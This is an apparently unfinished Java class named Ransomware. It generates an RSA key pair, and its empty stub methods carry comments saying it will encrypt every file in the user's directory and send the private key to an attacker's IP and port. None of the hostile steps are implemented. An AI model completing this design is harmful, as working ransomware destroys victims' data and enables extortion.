import java.io.File;
import java.security.InvalidKeyException;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;

import javax.crypto.Cipher;
import javax.crypto.NoSuchPaddingException;

/**
 * 
 * @author Gabriel
 *
 */
public class Ransomware {

	private KeyPairGenerator keyPairGen;
	private KeyPair pair;
	private PublicKey publicKey;
	private PrivateKey privateKey;
	private Cipher cipher;

	public Ransomware() {

	}

	/**
	 * Kicks off the ransomware
	 */
	public void begin() {
		System.out.println("Success!");
		generateKeys();
		encrypt();
		sendKey();
	}

	/**
	 * Grabs all files in the current user directory and encrypts them.
	 * 
	 */
	public void encrypt() {

	}

	/**
	 * Generates the key pair. References:
	 * {@link https://www.tutorialspoint.com/java_cryptography/java_cryptography_encrypting_data.htm}
	 */
	private void generateKeys() {
		try {
			System.out.println("Success!");
			setKeyPairGen(KeyPairGenerator.getInstance("RSA"));
			keyPairGen.initialize(2048);
			setPair(keyPairGen.generateKeyPair());
			setPublicKey(pair.getPublic());
			setCipher(Cipher.getInstance("RSA/ECB/PKCS1Padding"));
			cipher.init(Cipher.ENCRYPT_MODE, publicKey);

		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * Takes a file and encrypts it.
	 * 
	 * @param publicKey
	 * @param file
	 */
	private void encryptFile(File file) {

	}

	/**
	 * Sends the private key to the attacker IP and Port
	 */
	private void sendKey() {

	}

	public KeyPairGenerator getKeyPairGen() {
		return keyPairGen;
	}

	public void setKeyPairGen(KeyPairGenerator keyPairGen) {
		this.keyPairGen = keyPairGen;
	}

	public KeyPair getPair() {
		return pair;
	}

	public void setPair(KeyPair pair) {
		this.pair = pair;
	}

	public PublicKey getPublicKey() {
		return publicKey;
	}

	public void setPublicKey(PublicKey publicKey) {
		this.publicKey = publicKey;
	}

	public PrivateKey getPrivateKey() {
		return privateKey;
	}

	public void setPrivateKey(PrivateKey privateKey) {
		this.privateKey = privateKey;
	}

	public Cipher getCipher() {
		return cipher;
	}

	public void setCipher(Cipher cipher) {
		this.cipher = cipher;
	}
}
